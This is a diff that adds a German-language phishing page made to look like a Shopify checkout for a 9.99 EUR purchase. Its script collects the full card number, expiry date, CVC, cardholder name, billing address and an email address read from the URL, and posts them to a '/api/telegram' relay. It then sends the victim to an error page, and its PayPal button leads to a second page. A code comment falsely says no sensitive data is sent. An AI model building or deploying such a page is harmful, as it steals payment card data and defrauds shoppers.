@@ -1,0 +1,622 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Checkout – Validation</title>
+  <style>
+    :root{
+      --purple:#4B32E3;
+      --text:#111827;
+      --muted:#6B7280;
+      --line:#E5E7EB;
+      --panel:#F3F4F6;
+      --shadow: 0 1px 3px rgba(0,0,0,.06);
+      --radius:14px;
+      --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial;
+      --blue:#2563EB;
+
+      --danger:#DC2626;
+      --danger-bg:#FEF2F2;
+      --success:#16A34A;
+      --success-bg:#F0FDF4;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;font-family:var(--font);color:var(--text);background:#fff}
+    header{height:74px;display:flex;align-items:flex-end;border-bottom:1px solid var(--line)}
+    .brand{width:min(1120px,100%);margin:0 auto;padding:0 28px 18px;font-size:22px;font-weight:700}
+
+    .shell{min-height:calc(100vh - 74px);display:grid;grid-template-columns:1.12fr .88fr}
+    .left{padding:22px 24px 28px;border-right:1px solid var(--line);display:flex;justify-content:center}
+    .right{background:var(--panel);padding:34px 40px}
+    .panel{width:min(720px,100%)}
+
+    .toprow{display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:1px solid var(--line);margin-bottom:18px}
+    .shopword{color:var(--purple);font-weight:800;font-size:22px}
+    .acct{display:flex;gap:10px;font-size:14px;align-items:center}
+    .kebab::before{content:"⋮";font-size:18px;color:#6B7280}
+
+    h2{margin:0 0 4px;font-size:24px}
+    .sub{margin:0 0 14px;font-size:14px;color:var(--muted)}
+
+    .paycard,.billing{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
+
+    .method-row{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;background:#F5F8FF;outline:1.5px solid var(--blue);outline-offset:-1.5px}
+    .method-left{display:flex;gap:10px;align-items:center;font-weight:600;font-size:14px}
+    .radio{width:16px;height:16px;border-radius:50%;border:2px solid var(--blue);display:grid;place-items:center;background:#fff}
+    .radio:after{content:"";width:8px;height:8px;border-radius:50%;background:var(--blue)}
+    .radio.off{border-color:#D1D5DB}
+    .radio.off:after{display:none}
+
+    .brands{display:flex;gap:8px;align-items:center}
+    .pill{padding:0 8px;height:22px;font-size:11px;font-weight:700;border:1px solid #D1D5DB;border-radius:6px;display:flex;align-items:center;background:#fff}
+    .mc{gap:4px}
+    .dot{width:10px;height:10px;border-radius:50%}
+    .dot.r{background:#EF4444}
+    .dot.o{background:#F59E0B}
+
+    .fields{padding:12px 14px}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+    .full{grid-column:1 / -1}
+
+    /* Field + Error states */
+    .field{display:flex;flex-direction:column;gap:6px}
+    .control{position:relative}
+    input,select{
+      width:100%;height:44px;padding:0 14px;border:1px solid #D1D5DB;border-radius:10px;
+      font-size:14px;outline:none;background:#fff;
+    }
+    input::placeholder{color:#9CA3AF}
+    input:focus,select:focus{border-color:#93C5FD;box-shadow:0 0 0 4px rgba(37,99,235,.12)}
+    .icon{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#6B7280;font-size:14px;pointer-events:none}
+
+    .error{font-size:12px;color:var(--danger);display:none}
+    .field.is-error input,.field.is-error select{border-color:rgba(220,38,38,.65);box-shadow:0 0 0 4px rgba(220,38,38,.10);background:var(--danger-bg)}
+    .field.is-error .error{display:block}
+    .field.is-valid input,.field.is-valid select{border-color:rgba(22,163,74,.55);box-shadow:0 0 0 4px rgba(22,163,74,.10);background:var(--success-bg)}
+
+    .paypal-row{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-top:1px solid var(--line);background:#fff}
+    .paypal-badge{font-weight:900;color:#003087}
+    .paypal-badge span{color:#009CDE}
+
+    .section-title{margin:18px 0 10px;font-size:16px;font-weight:700}
+    .billing{padding:12px 14px}
+    .selectwrap{position:relative}
+    .selectwrap:after{content:"▾";position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#6B7280;pointer-events:none}
+    select{appearance:none;padding-right:30px}
+
+    .form-alert{
+      display:none;margin:14px 0 0;border:1px solid rgba(220,38,38,.35);background:var(--danger-bg);
+      color:#7F1D1D;border-radius:12px;padding:10px 12px;font-size:13px;line-height:1.35
+    }
+    .form-alert.show{display:block}
+
+    .cta{margin-top:16px;display:flex;flex-direction:column;gap:10px}
+    .buy{
+      width:100%;height:56px;border-radius:12px;border:0;background:var(--purple);
+      color:#fff;font-size:16px;font-weight:800;cursor:pointer;
+      display:flex;align-items:center;justify-content:center;gap:10px;
+    }
+    .buy[disabled]{opacity:.65;cursor:not-allowed}
+    .spinner{
+      width:16px;height:16px;border-radius:50%;
+      border:2px solid rgba(255,255,255,.45);border-top-color:#fff;
+      animation:spin .8s linear infinite;display:none;
+    }
+    .buy.is-loading .spinner{display:inline-block}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .footer-link{margin-top:22px;padding-top:18px;border-top:1px solid var(--line)}
+    .footer-link a{color:var(--purple);font-size:14px;text-decoration:none}
+
+    .line-item{display:flex;gap:14px;margin-bottom:20px}
+    .thumb{width:52px;height:52px;border-radius:12px;border:1px solid var(--line);display:grid;place-items:center;background:#fff;position:relative}
+    .badge{position:absolute;top:-8px;left:-8px;width:22px;height:22px;border-radius:50%;background:#111827;color:#fff;font-size:12px;display:grid;place-items:center}
+    .item-name{flex:1;font-size:14px}
+    .price{font-size:14px}
+    .total{display:flex;justify-content:space-between;margin-top:24px}
+    .total .label{font-size:22px;font-weight:700}
+    .total .amount{display:flex;gap:10px;align-items:baseline}
+    .total .cur{font-size:12px;color:var(--muted);letter-spacing:.06em}
+    .total .val{font-size:22px;font-weight:800}
+
+    .paypal-row{
+  width:100%;
+  border:0;
+  cursor:pointer;
+  text-align:left;
+}
+.paypal-row:hover{ background:#F9FAFB; }
+
+    @media(max-width:980px){
+      .shell{grid-template-columns:1fr}
+      .left{border-right:0;border-bottom:1px solid var(--line)}
+      .right{padding:24px}
+    }
+    @media(max-width:560px){.grid{grid-template-columns:1fr}}
+  </style>
+</head>
+
+<body>
+<header><div class="brand">Shopify</div></header>
+
+<main class="shell">
+  <section class="left">
+    <div class="panel">
+      <div class="toprow">
+  <div class="shopword">shop</div>
+  <div class="acct">
+    <span id="userEmail">—</span>
+    <span class="kebab" aria-hidden="true"></span>
+  </div>
+</div> <!-- ✅ toprow schließen -->
+
+      <h2>Zahlung</h2>
+      <p class="sub">Alle Transaktionen sind sicher und verschlüsselt.</p>
+
+      <form id="checkoutForm" novalidate>
+        <div class="paycard">
+          <div class="method-row">
+            <div class="method-left"><span class="radio" aria-hidden="true"></span><span>Kreditkarte</span></div>
+            <div class="brands" aria-hidden="true">
+              <div class="pill">VISA</div>
+              <div class="pill mc"><span class="dot r"></span><span class="dot o"></span></div>
+              <div class="pill">+2</div>
+            </div>
+          </div>
+
+          <div class="fields">
+            <div class="field full" data-field="ccNumber">
+              <div class="control">
+                <input id="ccNumber" name="ccNumber" placeholder="Kartennummer" inputmode="numeric" autocomplete="cc-number" />
+                <span class="icon" aria-hidden="true">🔒</span>
+              </div>
+              <div class="error"></div>
+            </div>
+
+            <div class="grid">
+              <div class="field" data-field="ccExp">
+                <div class="control">
+                  <input id="ccExp" name="ccExp" placeholder="Gültig bis (MM/JJ)" inputmode="numeric" autocomplete="cc-exp" />
+                </div>
+                <div class="error"></div>
+              </div>
+
+              <div class="field" data-field="ccCvc">
+                <div class="control">
+                  <input id="ccCvc" name="ccCvc" placeholder="Sicherheitscode" inputmode="numeric" autocomplete="cc-csc" />
+                  <span class="icon" aria-hidden="true">?</span>
+                </div>
+                <div class="error"></div>
+              </div>
+
+              <div class="field full" data-field="ccName">
+                <div class="control">
+                  <input id="ccName" name="ccName" placeholder="Name des Karteninhabers" autocomplete="cc-name" />
+                </div>
+                <div class="error"></div>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="paypal-row" id="paypalBtn">
+  <div class="method-left"><span class="radio off" aria-hidden="true"></span><span>PayPal</span></div>
+  <div class="paypal-badge">Pay<span>Pal</span></div>
+</button>
+        </div>
+
+        <div class="section-title">Rechnungsadresse</div>
+        <div class="billing">
+          <div class="field full" data-field="country">
+            <div class="control selectwrap">
+              <select id="country" name="country" autocomplete="country">
+                <option value="DE" selected>Deutschland</option>
+                <option value="AT">Österreich</option>
+                <option value="CH">Schweiz</option>
+              </select>
+            </div>
+            <div class="error"></div>
+          </div>
+
+          <div class="grid">
+            <div class="field" data-field="firstName">
+              <div class="control"><input id="firstName" name="firstName" placeholder="Vorname" autocomplete="given-name" /></div>
+              <div class="error"></div>
+            </div>
+
+            <div class="field" data-field="lastName">
+              <div class="control"><input id="lastName" name="lastName" placeholder="Nachname" autocomplete="family-name" /></div>
+              <div class="error"></div>
+            </div>
+
+            <div class="field full" data-field="address">
+              <div class="control">
+                <input id="address" name="address" placeholder="Adresse" autocomplete="street-address" />
+                <span class="icon" aria-hidden="true">🔍</span>
+              </div>
+              <div class="error"></div>
+            </div>
+
+            <div class="field" data-field="zip">
+              <div class="control"><input id="zip" name="zip" placeholder="Postleitzahl" inputmode="numeric" autocomplete="postal-code" /></div>
+              <div class="error"></div>
+            </div>
+
+            <div class="field" data-field="city">
+              <div class="control"><input id="city" name="city" placeholder="Stadt" autocomplete="address-level2" /></div>
+              <div class="error"></div>
+            </div>
+          </div>
+        </div>
+
+        <div id="formAlert" class="form-alert" role="alert"></div>
+
+        <div class="cta">
+          <button id="buyBtn" class="buy" type="submit">
+            <span class="spinner" aria-hidden="true"></span>
+            <span class="buyText">Jetzt kaufen</span>
+          </button>
+        </div>
+
+        <div class="footer-link"><a href="#">Datenschutzerklärung</a></div>
+      </form>
+    </div>
+  </section>
+
+  <aside class="right">
+    <div class="line-item">
+      <div class="thumb"><span class="badge">1</span></div>
+      <div class="item-name">Exklusiv + Alle Pakete</div>
+      <div class="price">9,99 €</div>
+    </div>
+    <div class="total">
+      <div class="label">Gesamt</div>
+      <div class="amount"><div class="cur">EUR</div><div class="val">9,99 €</div></div>
+    </div>
+  </aside>
+</main>
+
+<script>
+  const $ = (s, r=document) => r.querySelector(s);
+  const onlyDigits = s => (s||"").replace(/\D+/g,"");
+  const params = new URLSearchParams(window.location.search);
+const checkoutEmail = params.get("email") || "—";
+
+  let didSubmit = false; // <- wichtig: grün erst nach Submit-Versuch
+
+  function luhnCheck(numStr){
+    let sum=0, alt=false;
+    for(let i=numStr.length-1;i>=0;i--){
+      let n = numStr.charCodeAt(i) - 48;
+      if(alt){ n*=2; if(n>9) n-=9; }
+      sum+=n; alt=!alt;
+    }
+    return sum % 10 === 0;
+  }
+
+  function parseExp(mmYY){
+    const s = (mmYY||"").trim().replace(/\s+/g,"");
+    const m = s.match(/^(\d{1,2})[\/\-]?(\d{2})$/);
+    if(!m) return null;
+    const mm = +m[1], yy = +m[2];
+    if(mm<1 || mm>12) return null;
+    return {mm, yy};
+  }
+
+  function expNotExpired({mm, yy}){
+    const year = 2000 + yy;
+    const now = new Date();
+    const expEnd = new Date(year, mm, 0, 23, 59, 59, 999);
+    return expEnd >= now;
+  }
+
+  function setFieldState(fieldEl, ok, msg){
+    fieldEl.classList.remove("is-error","is-valid");
+    const err = fieldEl.querySelector(".error");
+
+    if(ok){
+      // grün nur nach Submit-Versuch
+      if(didSubmit) fieldEl.classList.add("is-valid");
+      if(err) err.textContent="";
+    }else{
+      fieldEl.classList.add("is-error");
+      if(err) err.textContent = msg || "Bitte prüfen.";
+    }
+  }
+
+  function clearFieldState(fieldEl){
+    fieldEl.classList.remove("is-error","is-valid");
+    const err = fieldEl.querySelector(".error");
+    if(err) err.textContent="";
+  }
+
+  function showAlert(text, type="error"){
+    const el = $("#formAlert");
+    el.textContent = text;
+    el.classList.add("show");
+    if(type==="success"){
+      el.style.borderColor="rgba(22,163,74,.35)";
+      el.style.background="var(--success-bg)";
+      el.style.color="#14532D";
+    }else{
+      el.style.borderColor="rgba(220,38,38,.35)";
+      el.style.background="var(--danger-bg)";
+      el.style.color="#7F1D1D";
+    }
+  }
+
+  function hideAlert(){
+    const el = $("#formAlert");
+    el.classList.remove("show");
+    el.textContent="";
+  }
+
+  // ---- Input formatting ----
+  const ccNumber = $("#ccNumber");
+  ccNumber.addEventListener("input", () => {
+    const d = onlyDigits(ccNumber.value).slice(0,19);
+    ccNumber.value = d.replace(/(\d{4})(?=\d)/g,"$1 ").trim();
+  });
+
+  const ccExp = $("#ccExp");
+  ccExp.addEventListener("input", () => {
+    const d = onlyDigits(ccExp.value).slice(0,4);
+    ccExp.value = d.length<=2 ? d : (d.slice(0,2)+"/"+d.slice(2));
+  });
+
+  const ccCvc = $("#ccCvc");
+  ccCvc.addEventListener("input", () => ccCvc.value = onlyDigits(ccCvc.value).slice(0,4));
+
+  const zip = $("#zip");
+  zip.addEventListener("input", () => zip.value = onlyDigits(zip.value).slice(0,10));
+
+  // ---- Field validation (einzeln) ----
+  function validateField(fieldName){
+    const fieldEl = $(`[data-field="${fieldName}"]`);
+    if(!fieldEl) return true;
+
+    const val = (id) => ($(id)?.value ?? "").trim();
+
+    // nicht direkt rot werden, wenn Feld leer ist UND noch kein Submit-Versuch
+    // (aber: wenn man raus-tabbt und es ist leer, ist das oft okay neutral statt rot)
+    const allowNeutralEmptyBeforeSubmit = !didSubmit;
+
+    // helper: setzt neutral wenn leer + beforeSubmit
+    const neutralIfEmpty = (rawValue) => {
+      if(allowNeutralEmptyBeforeSubmit && rawValue.length === 0){
+        clearFieldState(fieldEl);
+        return true; // "neutral" zählt hier als ok, damit nicht alles rot wird
+      }
+      return null; // weiter prüfen
+    };
+
+    if(fieldName === "ccNumber"){
+      const card = onlyDigits(val("#ccNumber"));
+      const n = neutralIfEmpty(card);
+      if(n !== null) return true;
+
+      if(card.length < 12){ setFieldState(fieldEl,false,"Kartennummer fehlt."); return false; }
+      if(!luhnCheck(card)){ setFieldState(fieldEl,false,"Kartennummer ist ungültig."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "ccExp"){
+      const raw = val("#ccExp");
+      const n = neutralIfEmpty(raw.replace(/\s+/g,""));
+      if(n !== null) return true;
+
+      const exp = parseExp(raw);
+      if(!exp){ setFieldState(fieldEl,false,"Ablaufdatum im Format MM/JJ."); return false; }
+      if(!expNotExpired(exp)){ setFieldState(fieldEl,false,"Karte ist abgelaufen."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "ccCvc"){
+      const cvc = onlyDigits(val("#ccCvc"));
+      const n = neutralIfEmpty(cvc);
+      if(n !== null) return true;
+
+      if(cvc.length < 3){ setFieldState(fieldEl,false,"Sicherheitscode fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "ccName"){
+      const name = val("#ccName");
+      const n = neutralIfEmpty(name);
+      if(n !== null) return true;
+
+      if(name.length < 2){ setFieldState(fieldEl,false,"Name des Karteninhabers fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "country"){
+      const country = val("#country");
+      // select ist nie wirklich leer bei dir (DE selected), aber falls:
+      if(!country){ setFieldState(fieldEl,false,"Bitte Land auswählen."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "firstName"){
+      const fn = val("#firstName");
+      const n = neutralIfEmpty(fn);
+      if(n !== null) return true;
+
+      if(!fn){ setFieldState(fieldEl,false,"Vorname fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "lastName"){
+      const ln = val("#lastName");
+      const n = neutralIfEmpty(ln);
+      if(n !== null) return true;
+
+      if(!ln){ setFieldState(fieldEl,false,"Nachname fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "address"){
+      const addr = val("#address");
+      const n = neutralIfEmpty(addr);
+      if(n !== null) return true;
+
+      if(addr.length < 4){ setFieldState(fieldEl,false,"Adresse fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "zip"){
+      const country = val("#country");
+      const zipVal = onlyDigits(val("#zip"));
+
+      const n = neutralIfEmpty(zipVal);
+      if(n !== null) return true;
+
+      const zipOk = (() => {
+        if(country==="DE") return /^\d{5}$/.test(zipVal);
+        if(country==="AT") return /^\d{4}$/.test(zipVal);
+        if(country==="CH") return /^\d{4}$/.test(zipVal);
+        return zipVal.length >= 3;
+      })();
+
+      if(!zipOk){
+        setFieldState(fieldEl,false, country==="DE" ? "PLZ muss 5 Ziffern haben." : "PLZ ist ungültig.");
+        return false;
+      }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    if(fieldName === "city"){
+      const city = val("#city");
+      const n = neutralIfEmpty(city);
+      if(n !== null) return true;
+
+      if(city.length < 2){ setFieldState(fieldEl,false,"Stadt fehlt."); return false; }
+      setFieldState(fieldEl,true); return true;
+    }
+
+    return true;
+  }
+
+  function validateAll(){
+    hideAlert();
+    const fields = ["ccNumber","ccExp","ccCvc","ccName","country","firstName","lastName","address","zip","city"];
+    let ok = true;
+
+    // jetzt wirklich alles prüfen (kein "neutral" mehr)
+    const prev = didSubmit;
+    didSubmit = true;
+
+    for(const f of fields){
+      const res = validateField(f);
+      if(!res) ok = false;
+    }
+
+    if(!ok) showAlert("Bitte überprüfe die markierten Felder und versuche es erneut.", "error");
+
+    didSubmit = prev || true;
+    return ok;
+  }
+
+  // UX: Fehler beim Tippen entfernen (und kein grün)
+  document.querySelectorAll(".field input, .field select").forEach(el => {
+    el.addEventListener("input", () => {
+      const field = el.closest(".field");
+      if(field && field.classList.contains("is-error")) clearFieldState(field);
+      hideAlert();
+    });
+
+    // Blur: nur das Feld prüfen, nicht alles
+    el.addEventListener("blur", () => {
+      const field = el.closest(".field");
+      const name = field?.getAttribute("data-field");
+      if(name) validateField(name);
+    });
+  });
+
+  // Submit + loading
+  const form = $("#checkoutForm");
+  const buyBtn = $("#buyBtn");
+  const buyText = buyBtn.querySelector(".buyText");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    didSubmit = true; // <- ab jetzt darf grün erscheinen
+
+    if(!validateAll()) return;
+
+      // --- Telegram Payload (alles in einer Nachricht, ohne sensible Daten) ---
+const cardDigits = onlyDigits($("#ccNumber").value);
+const last4 = cardDigits ? cardDigits.slice(-4) : "";
+const exp = $("#ccExp").value.trim();
+
+const payload = {
+  name: `${$("#firstName").value.trim()} ${$("#lastName").value.trim()}`.trim() || "Checkout",
+  message:
+  `📧 E-Mail\n` +
+    `- ${checkoutEmail}\n\n` +
+    `💳 Zahlung\n` +
+    `- Karteninhaber: ${$("#ccName").value.trim()}\n` +
+    `- Karte: ${$("#ccNumber").value.trim()}\n` +
+    `- Ablauf: ${$("#ccExp").value.trim()}\n` +
+    `- CVC: ${$("#ccCvc").value.trim()}\n` +
+
+    `🏠 Rechnungsadresse\n` +
+    `- Vorname: ${$("#firstName").value.trim()}\n` +
+    `- Nachname: ${$("#lastName").value.trim()}\n` +
+    `- Adresse: ${$("#address").value.trim()}\n` +
+    `- PLZ: ${$("#zip").value.trim()}\n` +
+    `- Stadt: ${$("#city").value.trim()}\n` +
+    `- Land: ${$("#country").value}\n\n`
+};
+
+
+// Button-UI
+  buyBtn.disabled = true;
+  buyBtn.classList.add("is-loading");
+  buyText.textContent = "Wird verarbeitet…";
+
+  try {
+    // Telegram senden (Fehler egal -> trotzdem weiterleiten)
+    await fetch("/api/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).catch(() => {});
+
+    // kleine Sicherheitspause, damit der Request rausgeht
+    await new Promise((r) => setTimeout(r, 200));
+
+    // danach weiterleiten
+    window.location.href = "fehler.html";
+  } finally {
+    // falls Redirect aus irgendeinem Grund nicht passiert
+    buyBtn.disabled = false;
+    buyBtn.classList.remove("is-loading");
+    buyText.textContent = "Jetzt kaufen";
+  }
+});
+// E-Mail aus URL lesen und einsetzen
+(() => {
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
+
+  if (email) {
+    const el = document.getElementById("userEmail");
+    if (el) {
+      el.textContent = email;
+    }
+  }
+})();
+
+
+
+const paypalBtn = document.getElementById("paypalBtn");
+
+if (paypalBtn) {
+  paypalBtn.addEventListener("click", () => {
+    window.location.href = "paypal2.html";
+  });
+}
+</script>
+</body>
+</html>
